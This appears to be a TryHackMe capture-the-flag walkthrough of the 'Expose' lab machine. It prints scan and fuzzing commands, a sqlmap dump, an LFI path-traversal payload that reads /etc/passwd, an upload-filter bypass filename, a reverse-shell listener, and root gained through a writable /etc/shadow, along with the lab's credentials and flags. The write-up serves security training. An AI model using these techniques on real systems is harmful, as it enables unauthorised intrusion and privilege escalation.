 # Expose - TryHackMe Walkthrough

## Challenge Information

| Category         | Value                                                                                    |
| ---------------- | ---------------------------------------------------------------------------------------- |
| Platform         | TryHackMe                                                                                |
| Challenge Name   | Expose                                                                                   |
| Difficulty       | Easy                                                                                     |
| Operating System | Linux                                                                                    |
| Objective        | Identify vulnerabilities in a production-like environment and obtain user and root flags |

Source Material:

---

# Initial Enumeration

## Target Information

```text
Main IP :: 10.48.151.114
```

---

# Nmap Scan

## Full Port Scan

```bash
nmap -p- 10.48.151.114
```

Results:

```text
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
1337/tcp open  waste
1883/tcp open  mqtt
```

Interesting services discovered:

* FTP
* SSH
* DNS
* Apache Web Server
* MQTT Broker

---

# Service Enumeration

## Version Detection

```bash
nmap -sCV -p 21,22,53,1337,1883 10.48.151.114
```

Results revealed:

### FTP

```text
vsFTPd 3.0.3
Anonymous Login Allowed
```

### SSH

```text
OpenSSH 8.2p1 Ubuntu
```

### DNS

```text
ISC BIND 9.16.1
```

### Web Server

```text
Apache 2.4.41
```

Running on:

```text
http://10.48.151.114:1337
```

### MQTT

```text
Mosquitto 1.6.9
```

---

# FTP Enumeration

Anonymous login was allowed:

```bash
ftp 10.48.151.114
```

Login:

```text
anonymous
```

The FTP server contained no useful files.

No further attack surface was identified.

---

# Web Enumeration

The web application running on port:

```text
1337
```

displayed:

```text
EXPOSED
```

---

# Directory Fuzzing

Using Gobuster:

```bash
gobuster dir -u http://10.48.151.114:1337/ -w /usr/share/wordlists/dirb/big.txt
```

Discovered:

```text
/admin
/admin_101
/javascript
/phpmyadmin
```

The most interesting directory was:

```text
/admin_101
```

---

# Admin_101 Enumeration

Inside the page we discovered an email address:

```text
hacker@root.thm
```

This indicated a possible backend database.

A request was captured through Burp Suite and tested with SQLMap.

---

# SQL Injection

Using:

```bash
sqlmap -r req.txt --dump
```

SQLMap successfully dumped database contents.

Database:

```text
expose
```

Table:

```text
config
```

Contents:

```text
+----+------------------------------+-----------------------------------------------------+
| id | url                          | password                                            |
+----+------------------------------+-----------------------------------------------------+
| 1  | /file1010111/index.php       | easytohack                                          |
| 3  | /upload-cv00101011/index.php | ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z    |
+----+------------------------------+-----------------------------------------------------+
```

---

# File1010111 Enumeration

Using:

```text
easytohack
```

allowed access to:

```text
/file1010111/index.php
```

---

# Parameter Discovery

Using FFUF:

```bash
ffuf -u "http://10.48.151.114:1337/file1010111/index.php?FUZZ=test" \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
```

Discovered parameter:

```text
file
```

---

# Local File Inclusion

Testing:

```text
http://10.48.151.114:1337/file1010111/index.php?file=../../../../etc/passwd
```

Successfully disclosed:

```text
/etc/passwd
```

The user list revealed:

```text
zeamkish
```

---

# Upload Portal Discovery

Using information from SQLMap:

```text
/upload-cv00101011/index.php
```

The application hinted:

```text
ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z
```

Using:

```text
zeamkish
```

granted access.

---

# File Upload Vulnerability

The page contained a file upload feature.

File upload filter bypass:

```text
evilcat.phpD.jpg
```

A PHP reverse shell was uploaded.

Example:

```text
PentestMonkey PHP Reverse Shell
```

---

# Uploaded Files Location

Viewing page source revealed:

```text
/upload-cv00101011/upload_thm_1001/
```

Uploaded files were accessible directly.

Executing the uploaded shell triggered a reverse connection.

---

# Initial Shell

Listener:

```bash
nc -lvnp 4444
```

Connection:

```text
uid=33(www-data)
gid=33(www-data)
```

We obtained a shell as:

```text
www-data
```

---

# Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```bash
CTRL + Z
```

Then:

```bash
stty raw -echo
fg
export TERM=xterm-256color
```

Shell successfully stabilized.

---

# Credential Discovery

While enumerating:

```text
/home/zeamkish
```

A file was discovered:

```text
ssh_creds.txt
```

Contents:

```text
SSH CREDS

zeamkish
easytohack@123
```

---

# SSH Access

Using:

```text
Username: zeamkish
Password: easytohack@123
```

SSH login succeeded.

---

# User Flag

```bash
cat flag.txt
```

Output:

```text
THM{USER_FLAG_1231_EXPOSE}
```

---

# Privilege Escalation

During enumeration it was discovered that:

```text
/etc/shadow
```

was writable by the current user.

This is a severe misconfiguration.

Example entry:

```text
loki:$y$j9T$ufhsHE928S1PI5xneCCTk/$22/UdycQyIAdU4A1gZB8VdIgHmeBsEuOoT2VzaJ4h2A
```

Since the shadow file was editable, root credentials could be manipulated directly.

After modifying the password hash:

```bash
su root
```

Root access was obtained.

---

# Root Flag

```bash
cat /root/flag.txt
```

Output:

```text
THM{ROOT_EXPOSED_1001}
```

---

# Attack Path

```text
Nmap Scan
    │
    ▼
Port 1337 Enumeration
    │
    ▼
Directory Fuzzing
    │
    ▼
/admin_101
    │
    ▼
SQL Injection
    │
    ▼
Database Dump
    │
    ▼
LFI Discovery
    │
    ▼
Enumerate Users
    │
    ▼
Upload Portal Access
    │
    ▼
File Upload Bypass
    │
    ▼
Reverse Shell
    │
    ▼
SSH Credentials Found
    │
    ▼
SSH Login as zeamkish
    │
    ▼
Writable /etc/shadow
    │
    ▼
Root Access
```

---

# Flags

## User Flag

```text
THM{USER_FLAG_1231_EXPOSE}
```

## Root Flag

```text
THM{ROOT_EXPOSED_1001}
```

---

# Vulnerabilities Identified

### SQL Injection

```text
/admin_101
```

Allowed extraction of sensitive database information.

---

### Local File Inclusion

```text
file=../../../../etc/passwd
```

Allowed arbitrary file disclosure.

---

### Insecure File Upload

Allowed execution of attacker-controlled PHP code.

---

### Credential Disclosure

```text
ssh_creds.txt
```

Stored plaintext SSH credentials.

---

### Writable Shadow File

```text
/etc/shadow
```

Direct privilege escalation to root.

---

# Conclusion

This machine demonstrated multiple common web application vulnerabilities chained together into a full system compromise:

* SQL Injection
* Local File Inclusion
* Arbitrary File Upload
* Credential Exposure
* Misconfigured Permissions

By combining these weaknesses, full compromise of the server was achieved, ending with root access and retrieval of both user and root flags.

Challenge completed successfully.
